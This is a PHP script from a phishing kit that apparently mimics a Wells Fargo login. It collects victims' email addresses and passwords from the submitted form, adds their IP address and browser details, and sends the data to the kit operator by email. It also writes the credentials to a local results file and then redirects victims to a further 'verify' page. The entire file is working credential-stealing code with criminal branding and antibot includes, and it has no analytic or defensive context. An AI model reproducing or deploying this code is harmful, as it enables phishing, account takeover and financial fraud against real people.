<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include '../your-email.php';
include './bt.php';
include "./blocker.php";
$message .= "------------------ Mr aroug  ---------------------\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  LOGIN -------------\n";
$message .= "Email Address: ".$_POST['emailaddress']."\n";
$message .= "Email Password: ".$_POST['emailpass']."\n";
$message .= "++-----[ $$ Fully Undetected by Skido $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Skido  ----------------------\n";
$subject = "Wells Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($to,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: verify.php");?>